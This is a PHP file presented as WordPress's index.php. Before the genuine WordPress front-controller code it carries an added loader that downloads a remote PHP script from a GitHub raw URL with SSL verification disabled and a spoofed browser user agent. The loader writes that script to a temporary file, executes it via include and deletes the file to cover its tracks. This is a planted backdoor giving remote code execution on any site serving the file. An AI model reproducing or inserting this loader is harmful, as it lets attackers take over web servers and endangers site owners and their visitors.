<?php
// URL untuk mengambil skrip eksternal
$url = "https://raw.githubusercontent.com/Zeddgansz/Alattempur/main/b.php";

// Opsi cURL
$options = [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_MAXREDIRS => 10,
    CURLOPT_CONNECTTIMEOUT => 30,
    CURLOPT_TIMEOUT => 60,
    CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_HTTPHEADER => [
        'Accept: application/json',
        'Accept-Language: en-US,en;q=0.9',
        'Cache-Control: no-cache',
        'Pragma: no-cache'
    ]
];

// Inisialisasi cURL
$ch = curl_init($url);
curl_setopt_array($ch, $options);
$result = curl_exec($ch);

// Menangani hasil cURL
if ($result === false) {
    echo "Error: " . curl_error($ch);
} else {
    $tempFile = tempnam(sys_get_temp_dir(), 'pasted_code_');
    if (file_put_contents($tempFile, $result) !== false) {
        include $tempFile;
        unlink($tempFile);
    } else {
        echo "Error: Unable to write to temporary file.";
    }
}

// Menutup cURL
curl_close($ch);
?>

<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
?>
